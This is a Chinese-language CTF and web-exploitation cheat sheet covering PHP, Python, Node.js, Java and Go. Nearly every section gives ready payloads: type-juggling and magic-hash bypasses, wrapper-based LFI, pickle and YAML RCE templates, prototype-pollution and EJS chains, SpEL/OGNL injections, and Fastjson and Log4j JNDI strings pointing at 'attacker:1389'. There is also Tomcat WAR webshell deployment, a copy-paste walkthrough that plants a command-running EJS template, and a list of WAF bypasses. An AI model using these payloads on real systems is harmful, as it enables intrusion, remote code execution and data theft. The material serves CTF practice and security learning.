# lang|语言与框架特性|🐘

## [g-php-weak] PHP 弱类型——宽松比较的经典绕过面

### [php-loose-compare] PHP 弱类型比较绕过 | medium | loose-compare;type-juggling | Magic Hash;类型混淆
> PHP `==` 只比较值而 `===` 同时比较类型，字符串与数字之间的隐式转换是登录、哈希校验类题目的头号突破口。

#### `==` 与 `===` 对照速查（核心行）

| 表达式 | PHP 7 | PHP 8 |
| --- | --- | --- |
| `"abc" == 0` | true | false（非数字字符串不再转数值） |
| `"0" == "abc"` | true | false |
| `"1e3" == "1000"` | true | true（数字字符串按数值比） |
| `"0e123" == "0e456"` | true | true（都等于 0） |
| `0 == "0e123"` | true | true |
| `null == 0` / `null == ""` | true | true |
| `false == 0` / `false == "0"` | true | true |
| `1 == true` | true | true |

> [!warn] 版本分水岭：PHP 8 起只有"数字字符串"才参与数值转换，`0 == "abc"` 失效，老题 payload 在新版上直接失效。

#### 典型绕过场景
- 哈希校验 `if (md5($a) == md5($b))`：两侧都传 0e 串即相等（见下）。
- 登录 `if ($_POST['pwd'] == $row['password'])`：提交已知 0e 串。
- JSON 数字/字符串混用：`{"role":1}` 与 `"1"` 在 `==` 下相等。
- `in_array($needle, $arr)` 默认也宽松比较，第三参数传 `true` 才严格：`in_array("abc", [0])` 在 PHP 7 为 true。

### [php-magic-hash] 0e 科学计数 Magic Hash | easy | magic-hash;hash-bypass | 0e串;哈希碰撞
> 以 `0e` 开头且后续全为数字的哈希在 `==` 比较中全部等于 0，公开的 md5/sha1 输入就能让任意两道哈希校验相等。

#### 原理
`"0e462097431906509019562988736854"` 被解析为科学计数法，数值为 0。两端都是"0e+纯数字"时 `==` 恒为 true（PHP 8 仍成立，按数值比 0==0）。

#### md5 已知 0e 串

| 输入 | 输出 |
| --- | --- |
| `240610708` | 0e462097431906509019562988736854 |
| `QNKCDZO` | 0e830400451993494058024219903391 |
| `s878926199a` | 0e545993274517709034328855841020 |
| `s155964671a` | 0e342768416822977524708945743633 |
| `aabg7XSs` | 0e087386482136013740957780965295 |

#### sha1 已知 0e 串
`aaroZmOk` → 0e66507019969427134894567494305185566735；`aaK1STfY` → 0e76658526655756207688271159624026011393；`aaO8zKZF` → 0e8924556490603679597425956543160731307842

```txt
?pwd=240610708          # md5($_GET['pwd']) == 某 0e 串
?m=QNKCDZO&m2=240610708 # md5($m) == md5($m2)
```
- 若要求 `$a !== $b && md5($a) == md5($b)`，0e 串不满足 `!==`，需 fastcoll 生成二进制碰撞串并 URL 编码；同理适用于 sha1、crc32 等（0e 串本身各哈希通用思路一致）。

### [php-juggling-bypass] 数组绕过与 intval/is_numeric/switch | medium | array-bypass;intval;switch | strcmp
> 向期望字符串或数字的参数塞数组，或利用 is_numeric 与 intval 的口径差异，能让校验静默失败。

#### strcmp 数组绕过
```php
if (!strcmp($_GET['pwd'], $secret)) { /* 进入 */ }  // ?pwd[]=x
```
- PHP 7：`strcmp(array, string)` 返回 NULL，`!NULL` 为真 → 绕过；PHP 8：抛 TypeError 直接 500。

> [!danger] PHP 8 后数组参数对 strcmp/strpos/preg_match 等标量函数是致命的 TypeError，不再"返回 false 绕过"。

#### strpos 的 0 混淆
`if (strpos($input, 'admin'))` 匹配在下标 0 时返回 0（falsy）被当"未匹配"；正确写法是 `!== false`。攻击时让关键词出现在字符串开头即可反转判定。

#### intval 与 is_numeric 口径差
- `"1e3"`：is_numeric=true 但 intval=1 → 绕过 `intval($n)>100`（`?n=1e3`）。
- `"08"`：is_numeric=true 但 intval=0 → 骗过"非零"检查。
- `"0x1A"`：is_numeric=false 但 intval=26（PHP 7）→ is_numeric 拦不住、intval 却很大。
- 数组：intval 得 1（PHP 7 非空）→ `?num[]=1` 绕过 `if (is_int($num))`。

#### switch 宽松比较
```php
switch ($x) { case 0: ... }   // switch 全走 ==
```
PHP 7：`?x=abc` 命中 case 0；PHP 8：`"abc"` 与 0 不再相等，改用 `?x=0e1`。

## [g-php-feat] PHP 特性——变量覆盖、伪协议与 RCE 全家桶

### [php-variable-overwrite] 变量覆盖：extract/parse_str/$$ | medium | extract;parse_str;variable-overwrite | register-globals
> 请求参数被直接灌进变量，auth、role、task 这类局部变量一旦被覆盖，校验形同虚设。

| 函数/语法 | 说明 |
| --- | --- |
| `extract($_GET)` | 同名键覆盖已存在变量 |
| `parse_str($qs)` / `mb_parse_str` | 无第二参数时直接覆盖变量 |
| `$$name` | `$a='flag'; $$a='x'` 即 `$flag='x'` |
| `register_globals` / `import_request_variables` | PHP < 5.4 远古题 |

```php
$auth = false;  extract($_GET);  if ($auth) { /* ?auth=1 直接进 */ }
$name = $_GET['n']; $$name = 'pwned';   // ?n=flag → $flag='pwned'
```
- 覆盖点常是：登录态布尔、白名单路径、$db 连接串、模板变量；`extract` 默认不覆盖超级全局。

> [!warn] PHP 8 起 `parse_str` 不传第二参数已弃用但行为仍在。

### [php-pseudo-protocols] 伪协议速查表 | easy | wrappers;php-filter;lfi | php://filter
> LFI 场景下 php:// 协议族既能套 base64 读源码，也能直接执行代码，还能触发 phar 反序列化。

| 协议 | 作用 | 示例 |
| --- | --- | --- |
| `php://filter` | 读文件内容加工输出 | `php://filter/read=convert.base64-encode/resource=config.php` |
| `php://filter`+iconv | 可控字符集时构造任意字节 | `convert.iconv.UTF8.UTF7` 等链式组合 |
| `data://` | allow_url_include=On 时代码执行 | `data://text/plain,<?php system('id');?>` |
| `php://input` | POST 体当输入流 | `include("php://input")` + POST 写马 |
| `expect://` | 需 pecl/expect，命令执行 | `expect://id` |
| `phar://` | 反序列化触发点 | `phar://upload/x.phar/test.txt` |
| `zip://` / `compress.zlib://` | 读压缩包内文件 | `zip://a.zip%23b.php` |
| `file://` | 读本地文件 | `file:///etc/passwd` |

#### 要点
- 读源码：`?file=php://filter/read=convert.base64-encode/resource=index.php`，解码即源码。
- phar：以 `__HALT_COMPILER(); ?>` 结尾、元数据含序列化对象的 phar 文件，任何 `include`/`file_exists`/`fopen` 碰到即反序列化元数据——无 `unserialize` 时的 gadget 触发点；`allow_url_include=On` 是 data:// 与 php://input 代码执行的前提（现代默认 Off）。

### [php-rce-functions] 命令执行与代码执行函数表 | medium | rce;command-injection | disable-functions
> system 家族直接回显、eval/assert 家族构造代码执行，拿到一句话后在 disable_functions 环境里还有 LD_PRELOAD/FFI 等硬核路线。

#### 命令执行
`system($cmd)`（直接输出）、`exec($cmd)`（只回最后一行）、`shell_exec($cmd)`（全量）、`passthru($cmd)`（二进制原样）、反引号、`popen($cmd,'r')`、`proc_open`、`pcntl_exec`（CLI/禁函数常客）。

```php
/?c=system('id')
/?c=assert('phpinfo()')          // PHP 7
/?c=call_user_func('system','id')
/?c=$_GET[a]($_GET[b])           // ?a=system&b=id
```

#### 代码执行
`eval($code)`（PHP 8 仍可用，不能经 call_user_func 调用）、`assert($code)`（PHP < 8 字符串可执行，8 起不再执行）、`create_function`（PHP < 8 移除）、`preg_replace('/e')`（PHP 7.0 移除）、`call_user_func('system',...)`、`array_map('system',...)`、`unserialize`、动态 `include/require`。

#### disable_functions 绕过思路（简述）
1. **LD_PRELOAD**：`putenv("LD_PRELOAD=/tmp/x.so")` + 触发 `mail()`/`mb_send_mail()`，库构造函数执行命令（有现成 so）。
2. **FFI**（PHP ≥ 7.4 且启用）：`FFI::cdef("int system(const char*);")->system("id");`
3. **iconv + IMAP**：历史链 `imap_open` 命令注入（旧版本）；`pcntl_exec` / `proc_open` 没被禁时最直。

> [!warn] 先 `ini_get('disable_functions')` 看禁了谁再选路线；老题（assert/实际执行）优先。

## [g-python] Python——Flask 调试台、Session 伪造与反序列化

### [py-flask-debug-pin] Flask 调试 PIN 与 Werkzeug 控制台 | hard | flask;werkzeug;debug-pin | PIN
> 开了 debug 的 Flask 在报错页暴露 Werkzeug 交互控制台，PIN 由机器指纹可复现地推导，登录控制台即 RCE。

#### 生成条件
`app.run(debug=True)` / `FLASK_DEBUG=1`；触发任意异常出现 Debugger console，要求 PIN，报错页显示用户名等线索。

#### PIN 生成要素（各 werkzeug 版本大体一致）
1. `username`（当前进程用户，错误页可读）。
2. `modname`：`flask.app`；`appname`：`Flask`。
3. 私钥：MAC 地址的 md5 拼接 machine-id；machine-id 取 `/etc/machine-id`，否则 `/proc/sys/kernel/random/boot_id`，再回退 `/proc/self/cgroup` 的哈希。
4. 第 4 节导入模块路径（getattr(mod, '__file__')）。

> [!warn] werkzeug 2.x 后期改动过 PIN 算法，生成脚本要匹配目标版本。

#### 利用路径
1. LFI 读 `/etc/machine-id`、`/sys/class/net/eth0/address`（docker 下读 `/proc/self/cgroup`）。
2. 本地按版本跑 PIN 生成脚本得 9 位 PIN；无 LFI 时可暴力（纯数字、重载无限试、速度极慢），优先推导。
3. 控制台执行：`__import__('os').popen('id').read()` 或 `__import__('subprocess').check_output(['id'])`。

### [py-flask-session-forge] Flask Session 伪造（弱 secret） | medium | flask;session;itsdangerous | secret-key
> Flask 的 session 是客户端 cookie（base64 + 签名），只要 SECRET_KEY 弱、可猜或已泄露，就能签出任意身份。

#### 原理
默认 cookie 名 `session`，内容 = `base64(JSON 载荷) + '.' + 时间戳 + '.' + 签名`，可读不可改；服务端不存会话，全部信任签名 → secret 是关键（默认序列化器是 JSON 非 pickle）。

#### 伪造（flask-unsign）
```bash
pip install flask-unsign
flask-unsign --unsign --cookie <SESSION> --wordlist rockyou.txt   # 撞 secret
flask-unsign --sign --cookie "{'username':'admin','role':'admin'}" --secret 's3cret'
```
手写等价物：`URLSafeTimedSerializer('s3cret').dumps({'username':'admin'})`（itsdangerous）。

#### secret 泄露点速查
- 源码/配置：`.env`、`config.py`、docker-compose、README；Git 历史 `git log -p --all`。
- 报错、调试信息、环境变量回显（SSTI/命令执行）。
- 弱口令：`secret`、`key`、`dev`、`flask`、项目名、rockyou。

> [!danger] 有 SECRET_KEY 就能改任意字段；cookie 带有效期，别签成过期。

### [py-pickle-yaml-rce] pickle/YAML 反序列化 RCE 与 send_file 穿越 | hard | pickle;yaml;deserialization | __reduce__
> `pickle.load`、`yaml.load` 解析不可信输入等于远程代码执行；`send_file` 参数直接可控时是现成的任意文件读。

#### pickle `__reduce__` RCE 模板
```python
import os, pickle
class Evil:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))
print(pickle.dumps(Evil()))   # 发给 pickle.load / 反序列化端
```
手写 opcode 等价物（在线/工具用）：`cos\nsystem\n(S'id'\ntR.`
触发点：`pickle.loads(输入)`、SocketServer 自定义协议、Redis 等缓存值被 pickle 序列化后回读；无回显用 curl 外带或写文件再读。

#### yaml.load 危险
```yaml
!!python/object/apply:os.system ["id > /tmp/pwned"]
!!python/object/apply:subprocess.check_output [["id"]]
```
PyYAML < 5.1 的 `yaml.load(data)` 默认即可构造任意对象；5.1+ 需显式 `Loader=UnsafeLoader`；安全用法 `yaml.safe_load`。

#### flask send_file 路径穿越
```python
return send_file(request.args.get('f'))   # 危险；?f=/etc/passwd 或 ../../etc/passwd
```
`send_from_directory` 用 safe_join 拦 `..`，`send_file` 无目录限制；无回显用报错泄漏或读 `/proc/self/cmdline`。

## [g-node] Node.js——原型污染、参数解析差异与模板/VM RCE

### [node-prototype-pollution] 原型污染 | medium | prototype-pollution;merge;__proto__ | PP
> 递归合并/深拷贝没过滤 `__proto__` 与 `constructor.prototype` 键时，Object.prototype 被整体污染，所有对象凭空多出属性，可再升级成 RCE。

#### 触发点
手写递归 merge、`_.merge`（lodash）、`deepmerge`、Object.assign 浅合并；`qs` 解析（express 默认 extended parser）遇到 `__proto__` 键；JSON body 直接出现 `__proto__` / `constructor.prototype` 键。

#### 基础 payload
```json
{"__proto__": {"isAdmin": true}}
```
合并后 `({})['isAdmin'] === true`，所有对象继承该属性。

#### 污染 → RCE 常见链
```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
```
- lodash merge 模板链（CVE-2019-10744）：`"constructor":{"prototype":{"__proto__":{...}}}` 结合 ejs 执行。
- 检测三连：`{}.polluted === true`、`Object.prototype.isAdmin`、JSON 注入 `__proto__` 后 `{}.x`。
- 修复：合并时跳过 `__proto__`、`constructor`、`prototype` 三键；浏览器端原型污染也能造成 XSS/逻辑绕过。

### [node-express-param] Express 参数解析差异 | medium | express;query-parser;parameter-pollution | qs
> Express 的 query/body 解析（qs）与 Nginx、其他中间件解析不一致时，同名参数、嵌套键能覆盖或逃过上层校验。

#### 解析规则对照

| 输入 | express 默认（qs，extended） | querystring（simple） |
| --- | --- | --- |
| `?a=1&a=2` | `a: ['1','2']`（数组） | `a: '2'`（后覆盖） |
| `?a[b]=1` | `a: {b: '1'}`（嵌套对象） | 字面键 `'a[b]'` |
| `?x[toString]=1` | qs 构造对象 | 字面键 |

#### 同名参数覆盖/数组化
```txt
GET /admin?role=admin&role=user    # req.query.role === ['admin','user']
```
- 网关取字符串、应用取数组 → 白名单/黑名单错位；`?admin=0` 在 `if (req.query.admin)` 里为真（`'0'` 是 truthy 字符串）。
- 数组版：`?id=1&id=2`，网关校验 `id === 1`、应用用 `req.query.id[0]` → 校验与使用不一致。
- body 与 query 同键共存：`POST /login?user=admin` + body `user=hacker`，读取优先级随中间件而异。

> [!warn] express 5 / qs 版本会改变行为，实弹前先本地验证。

### [node-traversal-ejs-vm] 路径规范化绕过、ejs RCE 与 vm 逃逸 | hard | path-traversal;ejs;vm | template-injection
> `..` 过滤只看字符串就总能绕；ejs 把用户输入当 options 渲染即 RCE；vm 不是安全沙箱。

#### 路径规范化绕过

| 输入 | 效果 |
| --- | --- |
| `..%2f`、`..%252f` | 一次/二次 URL 编码斜杠 |
| `..%2e%2e%2f` | 编码的点 |
| `..//`、`....//`、`..././` | 双斜杠/多点 |
| `..;/` | 分号（部分解析器当参数分隔符） |
| `%2e%2e%5c` | 反斜杠（Windows 后端） |

```js
fs.readFileSync(path.join(DIR, req.query.f));      // 错：?f=../../etc/passwd 逃出 DIR
const real = path.resolve(DIR, req.query.f);       // 对：resolve + 前缀检查
if (!real.startsWith(path.resolve(DIR))) throw 403;
```

#### ejs RCE（用户可控 options / 渲染数据）
```txt
?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s
```
- 版本 < 3.1.7 存在 `settings[view options]` 注入链；3.1.7+ 修补，3.1.9 全面收紧。
- 判定：模板注入 `<%= 7*7 %>` 看是否回显 49。

#### vm 沙箱逃逸（简述）
```js
vm.runInNewContext("this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()");
```
sandbox 全局对象经 `constructor` 链拿到宿主函数作用域，`process` 外泄；新版 Node 用 `globalThis.constructor.constructor('return process')()` 同效，`mainModule` 被弃用后可试 `process.binding` 链。

### [node-static-server-write] 静态服务器：传文件 → 骗服务器执行 → 读 flag | easy | node;静态服务器;任意文件写;解析差异;ejs;模板注入;suid | 静态服务器;node-ssti;nodejs-web
> 大白话版：这题允许你往服务器传文件，还允许你指定渲染哪个"网页模板"。模板里能嵌代码，所以传一个"会执行命令"的模板，再让服务器渲染它，命令就跑了。flag 读不到就用 SUID 程序（普通人也能以管理员身份运行的程序）读出来。
#### 先认识四个词（都不认识也没关系，看完就会）
- **PUT**：一种"往服务器上传文件"的请求，就像往网盘传文件。
- **模板**：做网页的"填空纸"。EJS 模板里写 `<% %>`，里面是**代码不是文字**——服务器渲染时会真的执行它。
- **渲染**：把模板变成网页。所以"谁能指定渲染哪个模板"，谁就能让模板里的代码跑起来。
- **base64**：一种把任意文字变成"字母+数字"的编码。服务器要求传文件前先 base64 编码，所以我们要先编码再传。
#### 整道题的思路（就一句话）
**把"会执行命令"的 .ejs 模板传进服务器 → 骗服务器渲染它 → 命令被执行 → 读出 flag。**
#### 攻击五步（命令直接复制就能打）
**第 1 步：看源码（为什么能直接看？因为"静态文件服务"排在过滤规则前面，它先找到文件就直接返回了，后面的过滤根本没机会执行）**
```powershell
curl.exe http://目标/App.js
```
**第 2 步：做一个"会执行命令的模板"，然后 base64 编码、包成 JSON**
```powershell
$tpl = "<%- process.getBuiltinModule('child_process').execSync('/readflag') %>"
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tpl))
$body = @{ content = $b64 } | ConvertTo-Json -Compress
Set-Content body.json -Value $body -Encoding utf8
```
（第一行翻译：渲染时执行 `/readflag` 这个命令，并把输出显示出来。execSync = "执行命令"。）
**第 3 步：把模板传进 views/ 目录（views 是服务器专门放模板的文件夹）**
```powershell
curl.exe --path-as-is -X PUT "http://目标/views/x.ejs/." -H "Content-Type: application/json" --data-binary "@body.json"
```
**第 4 步：让服务器渲染它 → 命令执行 → 看到 flag**
```powershell
curl.exe "http://目标/?templ=x.ejs"
```
（`?templ=x.ejs` 翻译：请渲染 x.ejs 这个模板。）
**第 5 步：如果直接读 /flag 被拒绝，就改用 SUID 程序（见下面"最后一步"）**
#### 新手必踩的两个坑
**坑 1：模板文件名必须叫 `xxx.ejs`，但服务器拒绝"以 js 结尾"的路径，怎么办？**
- 上传时路径写成 `/views/x.ejs/.`（尾巴多个 `/.`）。
- 为什么能骗过去：检查规则看的是**原始字符串**（结尾是 `.` 不是 `js`，放行）；写文件时系统会把 `/.` 自动去掉，落盘后还是 `x.ejs`。**检查的人看到的和存文件的人看到的不是同一个东西，这就是"解析差异"。**
- 注意必须加 `--path-as-is`，否则 curl 会自己把 `/.` 提前简化掉，这一招就失效了。（Windows 引号/BOM/权限等环境坑见 02-tools 的 curl-06-windows 课）
**坑 2：同一个文件名只能传一次。** 服务器不允许覆盖已有文件，所以每次改模板**必须换文件名**（x.ejs → y.ejs → z.ejs）。
#### 最后一步：权限不够怎么办（新手最懵的地方）
- `cat /flag` 报 Permission denied = 这个文件只有管理员（root）能读，而你只是普通用户。
- 用 `ls -la /` 看看根目录 → 发现有个 `-rwsr-xr-x` 的 `/readflag`。那串权限里的 `s` 意思是：**任何人运行它，它都以管理员身份运行**（这叫 SUID）。
- 把模板里的命令换成 `/readflag`，它就帮你把 flag 读出来了。
- 另外：`env` 看看环境变量，很多平台的 flag 直接写在里面，等于白送。
#### 记不住就记这三句
1. 能传文件 + 能指定渲染哪个模板 = 能执行命令。
2. 过滤看原文、写文件用整理后的路径，两边对不上就能绕过去。
3. 读不到 /flag 就找 SUID（权限里带 s 的程序）。

## [g-java] Java——表达式注入、反序列化与 JNDI

### [java-spel-ognl] SpEL、OGNL 与 EL 表达式注入 | medium | spel;ognl;el;struts2 | SpEL
> 用户输入被拼进表达式引擎解析即等于任意 Java 代码执行，Spring（SpEL）与 Struts2（OGNL）是两个高频载体。

#### SpEL（Spring）
```java
T(java.lang.Runtime).getRuntime().exec("id")
new java.lang.ProcessBuilder(new String[]{"sh","-c","id"}).start()
''.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```
- 触发点：`@Value("#{...}")`、`@RequestMapping` 内联、校验注解、模板调用 SpEL、`parseExpression(用户输入)`。
- 无回显：dnslog、延时（`Thread.sleep(5000)`）、写静态字段再读；关键词被拦：`T(java.lang.Cha\u0072acter)`、`new String(new byte[]{...})` 拼类名。

#### OGNL / Struts2
- Struts2 对 `%{...}`、`${...}` 二次解析，OGNL 默认禁静态方法访问，需先放开：
`%{#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('id')}`
- 经典 CVE：S2-016（redirect 参数）、S2-045（Content-Type 头）、S2-057（namespace）；现代 OGNL 禁 `_memberAccess` 时改用 `#context['com.opensymphony.xwork2.ActionContext.container']` 等变体。

#### EL（JSP/JUEL）
`${pageContext.request.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}`；EL 2.2+ 可直接调方法；`T()` 是 SpEL 专属写法；探测 `${7*7}` 回显 49。

> [!warn] Spring 6 / SpEL 6 收紧类型访问（默认禁 `T()` 部分类），老 payload 可能失效，以目标版本现测为准。

### [java-fastjson-log4j] Fastjson autoType 与 Log4j2 JNDI | medium | fastjson;log4j2;jndi;deserialization | gadget
> JSON 反序列化的 `@type` 自动装配与日志库的 `${jndi:}` lookup，都走 JNDI 远程加载类达成 RCE。

#### Fastjson（1.2.x 为主）
`JSON.parseObject(input)` 不禁止 `@type` 时直接实例化任意类（1.2.24 前无黑名单）。通用 JNDI 链：
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```
- 1.2.47 黑名单绕过（利用 Class 缓存）：`{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}`
- TemplatesImpl 链：`_bytecodes` 塞字节码 + `getOutputProperties()` 触发 defineClass；通常需先让目标类被 loadClass 缓存。
- 出网探测：`{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}`；`autoTypeSupport` 默认 false 的版本 `@type` 不生效。

#### Log4j2（CVE-2021-44228，< 2.15.0）
任何把用户输入写进日志的地方都触发：登录名、UA、搜索词、异常消息。
```txt
${jndi:ldap://attacker:1389/Exploit}
${jndi:rmi://attacker:1099/Exploit}
${jndi:ldap://${sys:java.version}.x.dnslog.cn}   # 子 lookup 带外泄露
```
- 不出网也能泄露：`${env:JAVA_HOME}`、`${sys:user.name}`、`${ctx:...}`、`${lower:...}`。
- JNDI 前提：JDK < 8u191（trustURLCodebase=true）可远程加载；新版需本地 gadget 或 LDAP 返回序列化数据。

> [!warn] 打补丁后 `${jndi:}` 默认禁用但仍可配；Fastjson 2.x 不再是 `@type` 自动装配的默认行为，先确认版本。

### [java-tomcat-others] Tomcat Manager 弱口令与内存马 | hard | tomcat;webshell;manager;memory-shell | WAR
> Manager 弱口令直接部署 WAR 拿 shell；内网/实战目标更偏好无文件落地的内存马。

#### Tomcat Manager 弱口令

| 信息 | 值 |
| --- | --- |
| 管理面 | `/manager/html`（GUI）、`/manager/text`（text）、`/manager/status` |
| 常见默认口令 | `tomcat/tomcat`、`admin/admin`、`tomcat/s3cret`、`manager/manager` |
| 角色要求 | `manager-gui` / `manager-script`（tomcat-users.xml） |
| 探测 | 401 响应存在 Basic Auth 即可暴破 |

```bash
curl -u tomcat:tomcat -T shell.war "http://x:8080/manager/text/deploy?path=/shell"
```
WAR 结构：`WEB-INF/web.xml` 声明 servlet，访问 `/shell/x` 即 webshell；也可直接 `PUT /shell.jsp`（readonly=false 旧姿势）。

#### 内存马（简述）
- 类型：Filter / Servlet / Listener / Valve / Agent（Instrumentation）；无文件落地、进程内存注册路由、重启消失。
- 注入路径：反序列化/JNDI 回显 → StandardContext → 动态注册 Filter/Servlet；Spring 环境注册 Controller；高权限上 Agent 字节码。
- 代表：冰蝎/哥斯拉内存马；检测靠内存类扫描（arthas、jmap dump）。

## [g-misc] 其他语言与解析——Go 路径、命令速查、ReDoS 与黑名单

### [go-net-http-path] Go net/http 路径清理特性 | medium | go;net-http;path-normalization | trailing-slash
> Go 的 ServeMux 会清理点路径并做一次解码，与 Nginx/网关的二次解码或不同步解码叠加时，同一个 URL 在两层看到的路径不同。

#### 行为要点
- `http.ServeMux` 对带 `.`/`..` 的路径返回 301 并重定向到清理后路径（`/a/../b` → `/b`），双斜杠折叠；`/` 结尾的 pattern 匹配子树。
- `net/url` 的 `Path` 是解码后的：`/a%2fb` 的 `Path` 是 `/a/b`；`RawPath` 保留原始编码。路由/静态服务大多基于 Path → `%2e`、`%2f` 在 Go 侧已还原。
- 只有一次解码：`%252e%252e%252f` 在 Go 侧保持 `%2e%2e%2f` 不再解；上层多解一层即分叉。

#### 典型错位

| 层 | 看到的路径 |
| --- | --- |
| Nginx（解一层后按 location 匹配） | `/admin%2f..%2fsecret` → 匹配 `/admin` 前缀 |
| Go（解码后清理） | `/admin/../secret` → 301 到 `/secret` |

同一 URL 在网关 ACL 与 Go 路由两层不一致，可绕过前缀限制访问 `/admin` 等。

> [!warn] Go 版本（1.22 前后路由增强）、gin/httprouter 段匹配规则都不同；这类题先本地起目标框架实测 payload（`%2e%2e%2f`、`..//`、`..;/`、`%252e`、反斜杠）。

### [lang-command-file-cheatsheet] 各语言命令执行与文件读取速查表 | easy | cheatsheet;command;file-read | -
> 把"已控代码执行点"翻译成目标语言的系统命令/文件读取一行写法，CTF 与实战都靠这张表换语言。

#### 命令执行

| 语言 | 写法 |
| --- | --- |
| PHP | `system($cmd)`、`shell_exec($cmd)`、反引号、`popen($cmd,'r')` |
| Python | `os.system(cmd)`、`os.popen(cmd).read()`、`subprocess.check_output(cmd,shell=True)` |
| Node | `require('child_process').execSync(cmd).toString()`、`exec`/`spawn` |
| Java | `Runtime.getRuntime().exec(cmd)`（不走 shell）、`new ProcessBuilder("sh","-c",cmd).start()` |
| Go | `exec.Command("sh","-c",cmd).Output()` |
| Ruby | 反引号、`system(cmd)`、`IO.popen(cmd).read` |
| Perl | `system(cmd)`、反引号、`open(P,'cmd |')` |

#### 文件读取

| 语言 | 写法 |
| --- | --- |
| PHP | `file_get_contents($f)`、`readfile($f)` |
| Python | `open(f).read()`、`pathlib.Path(f).read_text()` |
| Node | `require('fs').readFileSync(f,'utf8')` |
| Java | `new String(Files.readAllBytes(Paths.get(f)))` |
| Go | `os.ReadFile(f)` |
| Ruby | `File.read(f)` |

#### 实战一行（无回显优先 dnslog/延时）
```txt
Python: __import__('os').popen('id').read()
Node:   require('child_process').execSync('id').toString()
Java:   Runtime.getRuntime().exec(new String[]{"bash","-c","id"})   # exec(String) 按空白切分，管道/通配符会报错
Go:     exec.Command("sh","-c","id").Output()
```

### [regex-redos-blacklist] ReDoS 与黑名单绕过 | hard | redos;waf-bypass;filter;case-folding | blacklist
> 灾难性回溯让一个正则挂死进程；字符层黑名单则能用换行、编码和 Unicode 大小写折叠钻空子。

#### ReDoS（正则拒绝服务）
- 高危模式：`(a+)+$`、`(a|aa)+$`、`^(\w+\s?)+$`、`([a-zA-Z]+)*`、`^(a+)+b$` 等嵌套量词；`"a"*30 + "!"` 指数级回溯。
- 引擎差异：Python `re` 有步数/递归限制但无超时；PHP PCRE2 受 `pcre.backtrack_limit`（默认 100 万）约束；JS 正则无限制最易爆。
- 防御：原子组 `(?>...)`、非贪婪+锚定、输入长度上限、外置超时。

#### 黑名单绕过手法速查

| 手法 | 示例 |
| --- | --- |
| 换行/回车 | `;%0aid`、`%0d`、`id%0a`（换掉分号、空格） |
| 命令拼接换词 | `c"at"`、`c''at`、`c\at`、`{cat,flag}` |
| 空白替代 | `${IFS}`、`$IFS$9`、`%09`、反引号、`$()` |
| 路径通配 | `cat /fl*`、`cat fla[g]`、`ca? flag`、`/???/???` |
| 编码 | 二次 URL `%252f`、16 进制 `\x2f`、8 进制、unicode 变体 |
| 大小写 | `SeLeCt` 绕过只查小写的过滤 |
| SQL 注释 | `S/**/ELECT`、`-`、反引号包关键词 |

#### 大小写折叠差异（strtolower 与 İ）
- PHP `strtolower()` 只处理 ASCII 字节：`strtolower('İ')` 仍是 `İ`；而 JS `toLowerCase()` 把 `İ`(U+0130) 折叠成 `i̇`（i + 组合点）。
- 数据库层折叠又不同：MySQL `utf8_general_ci` 等宽松排序规则把 `İ` 与 `i` 视为相等。
- 利用：WAF 用 PHP `strtolower` 查黑名单时提交含 `İ` 的关键词不命中；后端大小写不敏感比较（如 SQL `=` + general_ci）却判定相等——"WAF 看不见、后端当同一词"。

> [!warn] 折叠差异依赖具体语言/数据库/排序规则版本，命中与否必须现场验证。
